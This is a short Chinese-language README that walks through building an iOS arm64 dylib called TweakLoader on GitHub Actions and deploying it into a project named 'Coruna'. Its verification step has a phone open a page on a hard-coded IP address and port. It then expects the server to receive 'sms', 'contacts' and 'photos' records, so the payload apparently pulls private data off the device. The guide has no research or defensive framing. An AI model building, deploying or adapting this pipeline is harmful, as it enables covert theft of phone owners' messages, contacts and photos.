# 推到 GitHub 并编译（本机无 Theos）

## 0. 前置
- 有 GitHub 账号
- 本机有 git（已有）
- 可选：安装 GitHub CLI `gh`（没有也能网页建仓）

## 1. 在 GitHub 新建空仓库
例如：`yourname/tweakloader-build`
不要勾选 README/.gitignore

## 2. 推送本目录
在 PowerShell：

```powershell
cd C:\Users\Administrator\Desktop\coruna-huy-tweak22\coruna-huy-tweak\tweakloader-build
git remote add origin https://github.com/你的用户名/tweakloader-build.git
git push -u origin main
```

## 3. 触发 Actions
打开仓库页面 → Actions → `Build TweakLoader` → Run workflow

## 4. 下载产物
Actions 成功后下载 artifact：
`TweakLoader-dylibs/TweakLoader_arm64.dylib`

## 5. 部署到 Coruna
```powershell
cd C:\Users\Administrator\Desktop\coruna-huy-tweak22\coruna-huy-tweak
.\deploy_tweakloader_from_ci.ps1 -ArtifactDylib "C:\Users\你\Downloads\TweakLoader_arm64.dylib"
```

## 6. 验证
手机打开：
`http://143.92.36.95:8080/group.html?v=routeA-built`

服务器应出现：
- `type=native_status`
- 或 `type=sms` / `contacts` / `photos`
